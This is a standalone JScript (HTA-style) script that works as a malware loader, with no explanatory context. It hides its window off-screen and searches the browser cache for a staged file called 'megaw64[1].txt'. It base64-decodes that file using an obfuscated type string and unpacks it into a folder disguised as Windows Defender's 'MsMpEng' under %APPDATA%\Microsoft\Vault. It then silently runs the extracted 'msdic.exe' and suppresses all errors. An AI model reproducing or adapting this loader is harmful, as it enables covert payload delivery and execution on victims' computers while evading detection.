/////////////////////////////////////////////////////////////////////////////////////////////
//<script language="javascript">

var fso = new ActiveXObject("Scripting.FileSystemObject");
var foundCount = 0;
var shell = new ActiveXObject("WScript.Shell");
var appPath;
var tmpPath;
var sPath;
var sName = "megaw64";

pos_main();

function pos_main()
{
	try
	{
		window.resizeTo(1,1);
		window.moveTo(5000,5000);
		pos_sub();
		window.close();
	}
	catch (e)
	{
		window.close();
	}
	
	return;
}

function sleep(milliseconds) 
{
	var delay = Math.ceil(milliseconds / 1000) + 1;
	shell.Run("ping 127.0.0.1 -n " + delay, 0, true);
}

function pos_sub()
{
	try
	{
		sleep(50);
		DeepSearch();
		sleep(500);
		startCopy();
		runDecoding();
		runDeCompress();
		startRunApp();
	}
	catch (e)
	{
	}
	
	return;
}

function startCopy()
{
	try {
		var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
		var fileName = sName + "[1]" + ".txt";
		var dPath = tempPath + "\\" + fileName;
		fso.CopyFile(sPath, dPath, true); 
		//shell.popup(sPath, 0, "msg", 64);
		sPath = dPath;
	} 
	catch (e) {
	}
}

function startRunApp()
{
	var binPath = appPath + "\\MsMpEng\\mingw64\\bin";
	var exePath = binPath + "\\msdic.exe";
	var logPath = binPath + "\\msdic.log";
	//shell.popup(exePath, 0, "msg", 64);
	//shell.popup(logPath, 0, "msg", 64);
	var command = exePath + ' "' + 'type ' + logPath + ' | ' + exePath + '" ' + '&& exit';
	//shell.popup(command, 0, "msg", 64);
	var errorCode = shell.Run(command, 0, true);
}

function runDeCompress()
{
	var inputPath = sPath;
	var outputPath = appPath;
	if (!fso.FileExists(inputPath))
		return;
	//shell.popup(sPath, 0, "msg", 64);
	//shell.popup(outputPath, 0, "msg", 64);
	var command = 'tar -xzvf "' + inputPath + '" -C "' + outputPath + '"';
	var errorCode = shell.Run(command, 0, true);
}

function runDecoding()
{
	try {
		var tPath = shell.ExpandEnvironmentStrings("%APPDATA%");
		var inputPath = sPath;
		appPath = tPath + "\\Microsoft\\Vault";
		var outputPath = appPath + "\\" + sName + ".tmp";

		if (!fso.FileExists(inputPath))
			return;

		var ts = fso.OpenTextFile(inputPath, 1); // 1 = ForReading
		var base64String = ts.ReadAll();
 		ts.Close();
		
		base64String = base64String.replace(/[\r\n\t ]/g, "");

		var xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
		var element = xmlDoc.createElement("tmp");
		var dataType = "bi";
		dataType = dataType + "n.bas";
		dataType = dataType + "e64";
		element.dataType = dataType;
		element.text = base64String;
 		var binaryBuffer = element.nodeTypedValue;

		var adoStream = new ActiveXObject("ADODB.Stream");
		adoStream.Type = 1; // 1 = adTypeBinary
		adoStream.Open();
		adoStream.Write(binaryBuffer);
		adoStream.SaveToFile(outputPath, 2); // 2 = adSaveCreateOverWrite
		adoStream.Close();
		sPath = outputPath;
	} 
	catch (err) {
        }
}

function DeepSearch() 
{
	foundCount = 0;
	var fileName = sName + "[1]" + ".txt";
	var shellApp = new ActiveXObject("Shell.Application");
	var cachePath = shellApp.Namespace(32).Self.Path;
	
	recursiveSearch(cachePath, fileName);
}

function recursiveSearch(folderPath, fileName) 
{
	try {
		var folder = fso.GetFolder(folderPath);

                var files = new Enumerator(folder.Files);
                for (; !files.atEnd(); files.moveNext()) {
			var file = files.item();
			if (file.Name.toLowerCase() === fileName.toLowerCase()) {
				sPath = file.Path;
				foundCount++;
			}
                }

                var subFolders = new Enumerator(folder.SubFolders);
                for (; !subFolders.atEnd(); subFolders.moveNext()) {
                    recursiveSearch(subFolders.item().Path, fileName);
		}
	} 
	catch (e) {
	}
}

function MakeBase64()
{
	var fileName = sName + ".txt";
	var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
	var outputPath = tempPath + "\\" + fileName;
	var textFile = fso.CreateTextFile(outputPath, true);
	textFile.Write(baseData);
	textFile.Close();
	sPath = outputPath;
}

//</script>
/////////////////////////////////////////////////////////////////////////////////////////////
